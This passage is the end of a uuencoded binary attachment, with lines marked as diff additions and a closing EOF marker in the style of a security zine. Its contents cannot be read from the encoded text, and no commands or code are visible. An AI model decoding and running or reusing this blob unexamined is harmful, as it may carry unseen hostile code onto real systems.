+MX:,\LEJ.J]D!5V\9PJ4V=2AG+@H,9K"0&6'E5`I'':!4I8$"/+I!QEN3`D4A
+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
+B_ZN@_)___.<___G/?_[SG__\YS__^7_B?P"TW*T!`,@`````
+`
+end
+
+--------[ EOF
